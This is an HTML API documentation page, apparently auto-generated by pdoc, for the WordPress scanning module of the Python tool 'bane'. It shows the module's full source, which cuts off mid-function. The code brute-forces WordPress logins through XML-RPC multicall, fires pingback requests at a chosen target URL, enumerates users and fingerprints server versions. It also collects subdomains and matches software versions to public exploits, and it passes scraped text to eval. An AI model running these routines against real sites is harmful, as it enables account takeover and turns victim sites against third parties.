<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.10.0" />
<title>bane.scanners.cms.wp API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.cms.wp</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.scanners.cms.utils import *




def wp_xmlrpc_methods(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        return [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
    except:
        pass
    return []


def wp_xmlrpc_bruteforce(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if &#34;wp.getUsersBlogs&#34; in [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]:
            return True
    except:
        pass
    return False


def wp_xmlrpc_mass_bruteforce(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None, headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
        if (&#34;wp.getUsersBlogs&#34; in l) and (&#34;system.multicall&#34; in l):
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback(
    u,
    user_agent=None,
    test_url=&#34;https://www.google.com/&#34;,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
        if &#34;pingback.ping&#34; in l:
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback_exploit(
    u,
    user_agent=None,
    target_url=&#34;https://www.google.com/&#34;,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    url = u.split(&#34;://&#34;)[0] + &#34;://&#34; + urlparse(u).netloc
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    url += path
    post = (
        &#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;&#34;&#34;&#34;
        + target_url
        + &#34;&#34;&#34;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;&#34;&#34;&#34;
        + u
        + &#34;&#34;&#34;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
&#34;&#34;&#34;
    )
    try:
        r = requests.Session().post(
            url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
    except:
        pass


def wpadmin(
    u,
    username,
    password,
    user_agent=None,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False&#34;&#34;&#34;
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;&#34;&#34;&#34;.format(
        username, password
    )
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if &#34;isAdmin&#34; in r.text:
            return True
    except:
        pass
    return False


def wpadmin_mass(
    u,
    word_list=[],
    user_agent=None,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False&#34;&#34;&#34;
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34;?&gt;
&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
 &#34;&#34;&#34;
    for x in word_list:
        post += &#34;&#34;&#34;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;
  &lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;
&#34;&#34;&#34;.format(
            x.split(&#34;:&#34;)[0], x.split(&#34;:&#34;)[1]
        )
    post += &#34;&#34;&#34;
&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
 &#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = (
            r.text.split(&#34;&lt;array&gt;&lt;data&gt;&#34;)[1]
            .split(&#34;&lt;/array&gt;&lt;/data&gt;&#34;)[0]
            .strip()
            .split(&#34;&lt;/struct&gt;&lt;/value&gt;&#34;)
        )
        for x in l:
            if &#34;Incorrect username or password&#34; not in x:
                return word_list[l.index(x)]
    except:
        pass
    return &#34;&#34;


def wp_users(
    u, path=&#34;/wp-json/wp/v2/users&#34;, timeout=10, user_agent=None, cookie=None, proxy=None, headers={}
):
    &#34;&#34;&#34;
    this function is to get WP users&#34;&#34;&#34;
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    u += path
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if (&#39;{&#34;id&#34;:&#39; in r.text) and (&#39;&#34;name&#34;:&#34;&#39; in r.text):
            a = json.loads(r.text)
            users = []
            for x in range(len(a)):
                users.append(
                    {&#34;id&#34;: a[x][&#34;id&#34;], &#34;slug&#34;: a[x][&#34;slug&#34;], &#34;name&#34;: a[x][&#34;name&#34;]}
                )
            return users
    except Exception as e:
        return []
    return []


def wp_user(
    u,
    path=&#34;/wp-json/wp/v2/users/&#34;,
    user=1,
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to return all informations about a WP user with a given index integer&#34;&#34;&#34;
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    hed.update(headers)
    u += path + str(user)
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if (&#39;{&#34;id&#34;:&#39; in r.text) and (&#39;&#34;name&#34;:&#34;&#39; in r.text):
            return json.loads(r.text)
    except Exception as e:
        pass


def wp_users_enumeration(
    u,
    path=&#34;/&#34;,
    timeout=15,
    user_agent=None,
    cookie=None,
    proxy=None,
    start=1,
    end=20,
    logs=True,
    headers={}
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    d = u.split(&#34;://&#34;)[1].split(&#34;/&#34;)[0]
    u = u.split(d)[0] + d
    l = []
    for x in range(start, end + 1):
        try:
            r = requests.Session().get(
                u + path + &#34;?author=&#34; + str(x),
                headers=hed,
                proxies=proxy,
                timeout=timeout,
                verify=False,
            ).text
            a = r.split(&#39;&lt;meta property=&#34;og:title&#34; content=&#34;&#39;)[1].split(&#34;&gt;&#34;)[0]
            b=r.split(&#39;&lt;meta property=&#34;og:url&#34; content=&#34;&#39;)[1].split(&#34;&gt;&#34;)[0]
            c=b.split(&#39;/author/&#39;)[1].split(&#39;/&#39;)[0]
            if &#34;,&#34; in a:
                a = a.split(&#34;,&#34;)[0]
                l.append({&#39;id&#39;:x, &#39;name&#39;:a,&#39;slug&#39;:c})
                if logs == True:
                    print(
                        &#34;\t[+] id: {} | name: {} | slug: {}&#34;.format(
                            x,#.encode(&#34;utf-8&#34;, &#34;replace&#34;), 
                            a,
                            c
                        )
                    )
        except KeyboardInterrupt:
            break
        except:
            pass
    return l


def wp_version(u, timeout=15, user_agent=None, cookie=None, proxy=None,headers={}):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    try:
        r = requests.Session().get(
            u, headers=hed, proxies=proxy, timeout=timeout, verify=False
        ).text
        return (
            r.split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;&#39;)[1]
            .split(&#39;&#34;&#39;)[0]
            .strip()
            .split(&#34; &#34;)[1]
        )
    except:
        pass



def version_string_to_list(version):
    return [int(x) for x in version.split(&#39;.&#39;)]




def extract_with_versions(cve_list,software_version):
    results = []
    for cve in cve_list:
        title = cve[&#39;title&#39;]
        try:
            version = [ x.strip() for x in title.split() if &#39;.&#39; in x and x.endswith(&#39;.&#39;)==False and x.startswith(&#39;.&#39;)==False][0]
        except:
            version=&#39;&#39;
        if version!=&#39;&#39;:
            try:
                c=title.split(version)[0].split()
                if c[-1].strip()==&#39;&lt;&#39;:
                    comparison=&#39;&lt;&#39;
                elif c[-1].strip()==&#39;&gt;&#39;:
                    comparison=&#39;&gt;&#39;
                elif c[-1].strip()==&#39;&lt;=&#39;:
                    comparison=&#39;&lt;=&#39;
                else:
                    comparison=&#39;==&#39;
            except:
                comparison=&#39;==&#39;
        if version==&#39;&#39;:
            version=software_version
        if &#39;-&#39; not in version:
            if eval(&#39;{}{}{}&#39;.format(version_string_to_list(software_version),comparison,version_string_to_list(version)))==True:
                results.append(cve)
        else:
            if eval(&#39;{}&gt;{} and {}&lt;{}&#39;.format(version_string_to_list(software_version),version_string_to_list(version.split(&#39;-&#39;)[0].strip()),version_string_to_list(software_version),version_string_to_list(version.split(&#39;-&#39;)[1].strip())))==True:
                results.append(cve)
    return results




def fetch_wp_exploits(s,max_tries=3,proxy=None,user_agent=None,timeout=15,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30):
    if s[&#39;version&#39;].strip()==&#39;&#39;:
        return []
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    i=1
    l=[]
    result=[]
    tries=0
    while True:
        tries+=1
        #print(tries)
        if tries==max_tries:
            break
        try:
            r=requests.Session().get(&#39;https://wpscan.com/search?page={}&amp;text={}&#39;.format(i,s[&#39;name&#39;]),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
            #print(r)
            data=json.loads(r.split(&#39;&#34;pageData&#34;:{&#34;props&#34;:{&#34;data&#34;:&#39;)[1].split(&#39;,&#34;metadata&#34;:{&#34;pageCount&#34;:&#39;)[0])
            if len(data)==0:
                break
            l+=data
            i+=1
            tries=0
        except Exception as ex:
            #raise(ex)
            time.sleep(when_blocked_sleep)
        time.sleep(random.randint(sleep_time_min,sleep_time_max))
    for x in l:
        x[&#39;exploit_url&#39;]=&#39;https://wpscan.com/vulnerability/&#39;+x[&#39;id&#39;]
    return extract_with_versions(l,s[&#39;version&#39;])



def get_wp_infos(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=15,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True,crt_timeout=120,wayback_timeout=120,subdomain_check_timeout=10,max_wayback_urls=10,subdomains_only=True,headers={},api_key=None):
    domain=u.split(&#39;://&#39;)[1].split(&#39;/&#39;)[0].split(&#39;:&#39;)[0]
    root_domain=extract_root_domain(domain)
    ip=socket.gethostbyname(domain.split(&#39;:&#39;)[0])
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    response = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
    server=response.headers.get(&#39;Server&#39;,&#39;&#39;)
    try:
        server_os=[x for x in server.split() if x.startswith(&#39;(&#39;)==True][0].replace(&#39;(&#39;,&#39;&#39;).replace(&#39;)&#39;,&#39;&#39;)
    except:
        server_os=&#39;&#39;
    backend=response.headers.get(&#39;X-Powered-By&#39;,&#39;&#39;)
    html_content = response.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, &#39;html.parser&#39;)

    # Find themes and plugins information
    themes = []
    plugins = []
    try:
        #print(response.split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;&#39;)[1].split(&#39;&#34;&#39;)[0])
        wp_version=response.text.lower().split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;wordpress&#39;)[1].split(&#39;&#34;&#39;)[0].strip()
    except Exception as ex:
        #raise(ex)
        wp_version=&#39;&#39;
    # Extract themes
    if logs==True:
        print(&#34;WordPress site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n\tWordPress version: {}\n&#34;.format(u,domain,ip,server,server_os,backend,wp_version))
    clickj=page_clickjacking(u,request_headers=response.headers)
    if logs==True:
        print(&#34;[i] Looking for subdomains...&#34;)
    subs=get_subdomains(root_domain,logs=logs, crt_timeout=crt_timeout,user_agent=user_agent,cookie=cookie,wayback_timeout=wayback_timeout,subdomain_check_timeout=subdomain_check_timeout,max_wayback_urls=max_wayback_urls,proxy=proxy,subdomains_only=subdomains_only)
    if logs==True:
        print(&#34;[i] Cheking if we can sniff some cookies over some links...&#34;)
        print()
    media_non_ssl=sniffable_links(u,content=response.text,logs=logs,request_headers=response.headers)
    if logs==True:
        print()
    theme_links = soup.find_all(&#39;link&#39;, rel=&#39;stylesheet&#39;)
    for link in theme_links:
        href = link.get(&#39;href&#39;)
        #print(href)
        if &#39;themes&#39; in href:
            try:
                theme_name = href.split(&#39;/themes/&#39;)[1].split(&#39;/&#39;)[0]
                try:
                    version=href.split(&#39;?&#39;)[1].split(&#39;=&#39;)[1]
                except:
                    version=&#39;&#39;
                theme={&#39;name&#39;:theme_name,&#39;version&#39;:version}
                if theme not in themes:
                    themes.append(theme)
            except:
                pass
        elif &#39;plugins&#39; in href:
            try:
                plugin_name = href.split(&#39;/plugins/&#39;)[1].split(&#39;/&#39;)[0]
                try:
                    version=href.split(&#39;?&#39;)[1].split(&#39;=&#39;)[1]
                except:
                    version=&#39;&#39;
                plugin={&#39;name&#39;:plugin_name,&#39;version&#39;:version}
                if plugin not in plugins:
                    plugins.append(plugin)
            except:
                pass
    users_json_exposed=True
    json_path=u+&#39;/wp-json/wp/v2/users&#39;
    if logs==True:
        print(&#39;[i] Fetching users from: {}&#39;.format(json_path))
    json_users=wp_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    if logs==True:
        for x in json_users:
            print(&#39;\t[+] id: {} | name: {} | slug: {}&#39;.format(x[&#39;id&#39;],x[&#39;name&#39;],x[&#39;slug&#39;]))
        print()
    if json_users==[]:
        users_json_exposed=False
    can_enumerate_users=True
    if logs==True:
        print(&#39;[i] Trying enumerating the authors...&#39;)
    enumerated_users= wp_users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,start=user_enum_start,end=user_enum_end,headers=headers)
    if enumerated_users==[]:
        can_enumerate_users=False
    else:
        if logs==True:
            print()
            for x in enumerated_users:
                print(&#39;\t[+] id: {} | name: {} | slug: {}&#39;.format(x[&#39;id&#39;],x[&#39;name&#39;],x[&#39;slug&#39;]))
    if logs==True:
        print()
        print(&#39;[i] Checking if XMLRPC is enabled from: {}&#39;.format(u+&#39;/xmlrpc.php&#39;))
    xmlrpcs=wp_xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    can_b_u=(&#34;wp.getUsersBlogs&#34; in xmlrpcs) and (&#34;system.multicall&#34; in xmlrpcs)
    can_pb=&#34;pingback.ping&#34; in xmlrpcs
    if logs==True:
        if len(xmlrpcs)&gt;0:
            print(&#39;[+] enabled&#39;)
            if can_b_u==True:
                print(&#39;\t[+] Vulnerable to users bruteforce&#39;)
            if can_pb==True:
                print(&#39;\t[+] Vulnerable to pingback&#39;)
        else:
            print(&#39;\t[-] disabled&#39;)
        print()
    wp_vulns=[]
    if wp_version!=&#39;&#39;:
        if logs==True:
            print(&#39;[i] looking for exploits for version: {}\n&#39;.format(wp_version))
        wpvulns=vulners_search(&#39;wordpress&#39;,version=wp_version,proxy=proxy,api_key=api_key)
        for x in wpvulns:
            if &#39;wordpress&#39; in x[&#39;title&#39;].lower() or &#39;wordpress&#39; in x[&#39;description&#39;].lower():
                wp_vulns.append(x)
        for x in wp_vulns:
            for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                try:
                    del x[i]
                except:
                    pass
        if logs==True:
            if len(wp_vulns)==0:
                print(&#39;\t[-] none was found&#39;)
            else:
                for x in wp_vulns:
                    print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                    print()
    backend_technology_exploits={}
    if backend!=&#39;&#39;:
        bk=[]
        for back in backend.split():
            if logs==True:
                print(&#39;[i] looking for exploits for : {}\n&#39;.format(back))
            if &#39;/&#39; not in back:
                if logs==True:
                    print(&#39;\t[-] unknown version\n&#39;)
            else:
                bk=vulners_search(back.split(&#39;/&#39;)[0].lower(),version=back.split(&#39;/&#39;)[1],proxy=proxy,api_key=api_key)
            for x in bk:
                for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                    try:
                        del x[i]
                    except:
                        pass
            backend_technology_exploits.update({back:bk})
            if logs==True:
                if len(bk)==0:
                    print(&#39;\t[-] none was found&#39;)
                else:
                    for x in bk:
                        print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                        print()
    server_exploits={}
    if server!=&#39;&#39;:
        for sv in server.split():
            if sv.startswith(&#39;(&#39;)==False:
                sv_e=[]
                if logs==True:
                    print(&#39;[i] looking for exploits for : {}\n&#39;.format(sv))
                if &#39;/&#39; in sv:
                    sv_e=vulners_search(sv.split(&#39;/&#39;)[0].lower(),version=sv.split(&#39;/&#39;)[1],proxy=proxy,api_key=api_key)
                else:
                    if logs==True:
                        print(&#39;\t[-] unknown version\n&#39;)
                for x in sv_e:
                    for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                        try:
                            del x[i]
                        except:
                            pass
                server_exploits.update({sv:sv_e})
                if logs==True:
                    if len(sv_e)==0:
                        print(&#39;\t[-] none was found&#39;)
                    else:
                        for x in sv_e:
                            print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                            print()
    if len(themes)&gt;0:
        if logs==True:
            print(&#39;[i] looking for exploits for the themes:\n&#39;)
    for x in themes:
        if logs==True:
